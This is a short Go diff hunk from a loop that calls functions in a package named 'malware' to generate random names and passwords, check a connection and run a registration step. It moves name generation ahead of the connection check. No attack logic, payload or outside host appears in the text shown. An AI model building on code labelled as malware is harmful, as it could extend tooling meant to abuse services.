@@ -17,9 +17,10 @@ func main() {
 		return
 	}
 	for {
+		name := malware.NewName(4)
+		config.SetName(name)
 		// check connection
 		malware.CheckConnection(*config)
-		name := malware.NewName(4)
 		password := malware.NewPassword(10)
 		// opaque reg
 		err := malware.DoPwreg(name, password, *config)
